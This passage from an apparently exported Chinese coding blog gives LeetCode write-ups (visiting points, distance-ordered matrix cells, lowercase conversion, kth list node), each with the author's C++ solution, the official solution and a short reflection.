<p><img src="/2020/11/09/%E8%AE%BF%E9%97%AE%E6%89%80%E6%9C%89%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%97%B6%E9%97%B4/1626_example_1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：points &#x3D; [[1,1],[3,4],[-1,0]]</span><br><span class="line">输出：7</span><br><span class="line">解释：一条最佳的访问路径是： [1,1] -&gt; [2,2] -&gt; [3,3] -&gt; [3,4] -&gt; [2,3] -&gt; [1,2] -&gt; [0,1] -&gt; [-1,0]   </span><br><span class="line">从 [1,1] 到 [3,4] 需要 3 秒 </span><br><span class="line">从 [3,4] 到 [-1,0] 需要 4 秒</span><br><span class="line">一共需要 7 秒</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：points &#x3D; [[3,2],[-2,2]]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>points.length == n</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>points[i].length == 2</code></li>
<li><code>-1000 &lt;= points[i][0], points[i][1] &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>关键在于当前点到下个点需要最小时间就是两点横坐标之差与纵坐标之差中的最大值，遍历n个点依次计算到下个点所需要的最小时间，累加得到结果。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败47.67%，内存消耗9.9M，击败7.58%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n=points.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1=<span class="built_in">abs</span>(points[i][<span class="number">0</span>]-points[i+<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">int</span> tmp2=<span class="built_in">abs</span>(points[i][<span class="number">1</span>]-points[i+<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">            <span class="comment">//当前点到下个点需要时间=max（横坐标之差，纵坐标之差）</span></span><br><span class="line">            result+=tmp1&gt;tmp2?tmp1:tmp2; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/minimum-time-visiting-all-points/solution/fang-wen-suo-you-dian-de-zui-xiao-shi-jian-by-le-2/">官方题解</a>:</h6><p><strong>方法一：切比雪夫距离</strong><br>对于平面上的两个点 <code>x = (x0, x1)</code> 和 <code>y = (y0, y1)</code>，设它们横坐标距离之差为 <code>dx = |x0 - y0|</code>，纵坐标距离之差为 <code>dy = |x1 - y1|</code>，对于以下三种情况，我们可以分别计算出从 x 移动到 y 的最少次数：</p>
<p><code>dx &lt; dy</code>：沿对角线移动 <code>dx</code> 次，再竖直移动 <code>dy - dx</code> 次，总计 <code>dx + (dy - dx) = dy</code> 次；</p>
<p><code>dx == dy</code>：沿对角线移动 <code>dx</code> 次；</p>
<p><code>dx &gt; dy</code>：沿对角线移动 <code>dy</code> 次，再水平移动 <code>dx - dy</code> 次，总计 <code>dy + (dx - dy) = dx</code> 次。</p>
<p>可以发现，对于任意一种情况，从 <code>x</code> 移动到 <code>y</code> 的最少次数为 <code>dx</code> 和 <code>dy</code> 中的较大值 <code>max(dx, dy)</code>，这也被称作 <code>x</code> 和 <code>y</code> 之间的 切比雪夫距离。</p>
<p>由于题目要求，需要按照数组中出现的顺序来访问这些点。因此我们遍历整个数组，对于数组中的相邻两个点，计算出它们的切比雪夫距离，所有的距离之和即为答案。</p>
<p><strong>c++代码：</strong>（执行8ms，击败97.24%，内存9.9M，击败5.55%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x0 = points[<span class="number">0</span>][<span class="number">0</span>], x1 = points[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; points.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> y0 = points[i][<span class="number">0</span>], y1 = points[i][<span class="number">1</span>];</span><br><span class="line">            ans += max(<span class="built_in">abs</span>(x0 - y0), <span class="built_in">abs</span>(x1 - y1));</span><br><span class="line">            x0 = y0;</span><br><span class="line">            x1 = y1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>和官方题解思路相同，代码稍有差别，棒棒哒😘</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>距离顺序排列矩阵单元格</title>
    <url>/2020/11/24/%E8%B7%9D%E7%A6%BB%E9%A1%BA%E5%BA%8F%E6%8E%92%E5%88%97%E7%9F%A9%E9%98%B5%E5%8D%95%E5%85%83%E6%A0%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给出 <code>R</code> 行 <code>C</code> 列的矩阵，其中的单元格的整数坐标为 <code>(r, c)</code>，满足 <code>0 &lt;= r &lt; R</code> 且 <code>0 &lt;= c &lt; C</code>。</p>
<p>另外，我们在该矩阵中给出了一个坐标为 <code>(r0, c0)</code> 的单元格。</p>
<p>返回矩阵中的所有单元格的坐标，并按到 <code>(r0, c0)</code> 的距离从最小到最大的顺序排，其中，两单元格<code>(r1, c1)</code> 和 <code>(r2, c2)</code> 之间的距离是曼哈顿距离，<code>|r1 - r2| + |c1 - c2|</code>。（你可以按任何满足此条件的顺序返回答案。）</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：R &#x3D; 1, C &#x3D; 2, r0 &#x3D; 0, c0 &#x3D; 0</span><br><span class="line">输出：[[0,0],[0,1]]</span><br><span class="line">解释：从 (r0, c0) 到其他单元格的距离为：[0,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：R &#x3D; 2, C &#x3D; 2, r0 &#x3D; 0, c0 &#x3D; 1</span><br><span class="line">输出：[[0,1],[0,0],[1,1],[1,0]]</span><br><span class="line">解释：从 (r0, c0) 到其他单元格的距离为：[0,1,1,2]</span><br><span class="line">[[0,1],[1,1],[0,0],[1,0]] 也会被视作正确答案。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：R &#x3D; 2, C &#x3D; 3, r0 &#x3D; 1, c0 &#x3D; 2</span><br><span class="line">输出：[[1,2],[0,2],[1,1],[0,1],[1,0],[0,0]]</span><br><span class="line">解释：从 (r0, c0) 到其他单元格的距离为：[0,1,1,2,2,3]</span><br><span class="line">其他满足题目要求的答案也会被视为正确，例如 [[1,2],[1,1],[0,2],[1,0],[0,1],[0,0]]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= R &lt;= 100</code></li>
<li><code>1 &lt;= C &lt;= 100</code></li>
<li><code>0 &lt;= r0 &lt; R</code></li>
<li><code>0 &lt;= c0 &lt; C</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历矩阵，计算每个单元格与（r0，c0）的曼哈顿距离d，然后d作为键，单元格的坐标作为值存到multimap容器中，利用multimap容器的特性：容器中元素按关键字排序，并且允许多个关键字相同。遍历完成得到按曼哈顿距离升序排序的multimap容器，遍历multimap把值依次放到结果中，最后返回。</p>
<p><strong>c++代码：</strong>(执行用时176ms，击败17.98%，内存消耗29M，击败15.48%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">allCellsDistOrder</span><span class="params">(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">multimap</span>&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; m;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">        <span class="keyword">int</span> d;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;R;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;C;++j)&#123;</span><br><span class="line">                v.clear();</span><br><span class="line">                v.emplace_back(i);</span><br><span class="line">                v.emplace_back(j);</span><br><span class="line">                d=<span class="built_in">abs</span>(r0-i)+<span class="built_in">abs</span>(c0-j);</span><br><span class="line">                <span class="comment">//map可以用m[d]=v赋值，multimap不能</span></span><br><span class="line">                m.insert(<span class="built_in">pair</span>&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;(d,v));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> tmp:m)&#123;</span><br><span class="line">            result.emplace_back(tmp.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/matrix-cells-in-distance-order/solution/ju-chi-shun-xu-pai-lie-ju-zhen-dan-yuan-ge-by-leet/">官方题解</a>:</h6><p><strong>方法一：直接排序</strong></p>
<p><strong>思路及解法</strong></p>
<p>最容易想到的方法是首先存储矩阵内所有的点，然后将其按照哈曼顿距离直接排序。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">allCellsDistOrder</span><span class="params">(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; C; j++) &#123;</span><br><span class="line">                ret.push_back(&#123;i, j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(ret.begin(), ret.end(), [=](<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; a, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - r0) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - c0) &lt; <span class="built_in">abs</span>(b[<span class="number">0</span>] - r0) + <span class="built_in">abs</span>(b[<span class="number">1</span>] - c0);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(RC \log(RC))$，存储所有点时间复杂度 $O(RC)$，排序时间复杂度 $O(RC \log(RC))$。</p>
</li>
<li><p>空间复杂度：$O(log(RC))$，即为排序需要使用的栈空间，不考虑返回值的空间占用。</p>
</li>
</ul>
<p><strong>方法二：桶排序</strong></p>
<p><strong>思路及解法</strong></p>
<p>注意到方法一中排序的时间复杂度太高。实际在枚举所有点时，我们可以直接按照哈曼顿距离分桶。这样我们就可以实现线性的桶排序。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dist</span><span class="params">(<span class="keyword">int</span> r1, <span class="keyword">int</span> c1, <span class="keyword">int</span> r2, <span class="keyword">int</span> c2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">abs</span>(r1 - r2) + <span class="built_in">abs</span>(c1 - c2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">allCellsDistOrder</span><span class="params">(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxDist = max(r0, R - <span class="number">1</span> - r0) + max(c0, C - <span class="number">1</span> - c0);</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&gt; <span class="title">bucket</span><span class="params">(maxDist + <span class="number">1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; R; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; C; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> d = dist(i, j, r0, c0);</span><br><span class="line">                <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp = &#123;i, j&#125;;</span><br><span class="line">                bucket[d].push_back(move(tmp));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ret;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= maxDist; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;it : bucket[i]) &#123;</span><br><span class="line">                ret.push_back(it);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(RC)$，存储所有点时间复杂度 $O(RC)$，桶排序时间复杂度 $O(RC)$。</p>
</li>
<li><p>空间复杂度：$O(RC)$，需要存储矩阵内所有点。</p>
</li>
</ul>
<p><strong>方法三：几何法</strong></p>
<p><strong>思路及解法</strong></p>
<p>我们也可以直接变换枚举矩阵的顺序，直接按照曼哈顿距离遍历该矩形即可。</p>
<p>注意到曼哈顿距离相同的位置恰好构成一个斜着的正方形边框，因此我们可以从小到大枚举曼哈顿距离，并使用循环来直接枚举该距离对应的边框。我们每次从该正方形边框的上顶点出发，依次经过右顶点、下顶点和左顶点，最后回到上顶点。这样即可完成当前层的遍历。</p>
<p><img src="/2020/11/24/%E8%B7%9D%E7%A6%BB%E9%A1%BA%E5%BA%8F%E6%8E%92%E5%88%97%E7%9F%A9%E9%98%B5%E5%8D%95%E5%85%83%E6%A0%BC/1.png" alt="fig1"></p>
<p>注意正方形边框中的部分点不一定落在矩阵中，所以我们需要做好边界判断。</p>
<p><strong>代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dr[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dc[<span class="number">4</span>] = &#123;<span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">allCellsDistOrder</span><span class="params">(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxDist = max(r0, R - <span class="number">1</span> - r0) + max(c0, C - <span class="number">1</span> - c0);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ret;</span><br><span class="line">        <span class="keyword">int</span> row = r0, col = c0;</span><br><span class="line">        ret.push_back(&#123;row, col&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> dist = <span class="number">1</span>; dist &lt;= maxDist; dist++) &#123;</span><br><span class="line">            row--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((i % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; row != r0) || (i % <span class="number">2</span> != <span class="number">0</span> &amp;&amp; col != c0)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (row &gt;= <span class="number">0</span> &amp;&amp; row &lt; R &amp;&amp; col &gt;= <span class="number">0</span> &amp;&amp; col &lt; C) &#123;</span><br><span class="line">                        ret.push_back(&#123;row, col&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    row += dr[i];</span><br><span class="line">                    col += dc[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O\big((R+C)^2\big)$，我们需要遍历矩阵内所有点，同时也会遍历部分超过矩阵部分的点。在最坏情况下，给定的单元格位于矩阵的一个角，例如 $(0,0)$，此时最大的曼哈顿距离为 $R+C-2$，需要遍历的点数为 $2(R+C-2)(R+C-1)+1$，因此时间复杂度为 $O\big((R+C)^2\big)$。</p>
</li>
<li><p>空间复杂度：$O(1)$，不考虑返回值的空间占用。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解直接排序自定义sort排序规则遇到好几次了，自己还是不太会，留作以后补充，桶排序方法也比较常见，至于第三种方法说实话没看懂，作为LeetCode官方题解遗留问题，以后回来做补充。</p>
<p>ps：我要赶紧3道题打完卡去学数学了，啊啊啊😮</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>转换成小写字母</title>
    <url>/2020/11/13/%E8%BD%AC%E6%8D%A2%E6%88%90%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/to-lower-case/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现函数 ToLowerCase()，该函数接收一个字符串参数 str，并将该字符串中的大写字母转换成小写字母，之后返回新的字符串。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Hello&quot;</span><br><span class="line">输出: &quot;hello&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;here&quot;</span><br><span class="line">输出: &quot;here&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LOVELY&quot;</span><br><span class="line">输出: &quot;lovely&quot;</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串中的每个字符，利用字母的ASCII码的特性（小写字母比大写字母数值大32，如’a‘是97，’A’是65），或操作将每个字母的字母的第6位置为1（大写字母第6位0变1增大了32变成小写，小写字母第6位1还是1，不变）。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败12.53%，内存消耗6.3M，击败8.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">toLowerCase</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();++i)&#123;</span><br><span class="line">            <span class="comment">//把字母转换成小写，把字母二进制第六位置为1,（大写字母为0，小写字母为1）</span></span><br><span class="line">            str[i]=str[i]|<span class="number">32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，或许是太简单了不稀得写吧😛，不多说了</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>返回倒数第k个节点</title>
    <url>/2020/11/10/%E8%BF%94%E5%9B%9E%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/kth-node-from-end-of-list-lcci/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>实现一种算法，找出单向链表中倒数第 k 个节点。返回该节点的值。</p>
<p><strong>注意：</strong>本题相对原题稍作改动</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 1-&gt;2-&gt;3-&gt;4-&gt;5 和 k &#x3D; 2</span><br><span class="line">输出： 4</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<p>给定的$k$保证是有效的。</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>和上道题<a href="https://z2bns.github.io/2020/11/10/%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/">链表中倒数第k个节点</a>基本一样，只是把返回的节点改成节点的值而已。</p>
<p>遍历链表，把每个结点指针存到vector容器中，返回倒数第k个节点的值可以直接下标获取。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败73.35%，内存消耗10.6M，击败5.61%）</p>
